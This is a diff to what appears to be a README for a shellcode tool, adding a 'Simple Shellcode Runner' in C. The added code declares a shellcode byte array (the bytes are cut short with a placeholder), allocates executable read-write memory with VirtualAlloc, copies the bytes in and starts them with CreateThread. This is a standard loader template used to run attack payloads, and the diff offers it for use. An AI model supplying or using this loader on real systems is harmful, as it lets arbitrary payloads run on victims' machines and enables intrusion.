@@ -71,7 +71,19 @@ Users can choose to execute generated shellcode in this Python script, generated
 ### Simple Shellcode Runner
 #### C
 ```c
+#include "windows.h"
+#include "stdlib.h"
 
+unsigned char shellcode[] = {
+  0xfc, 0x48, 0x83, 0xe4, 0xf0......};  // SHELLCODE HERE
+
+int main()
+{
+    int length = sizeof(shellcode);
+    void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    RtlMoveMemory(exec, shellcode, length);
+    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+}
 ```
 
 #### CSharp
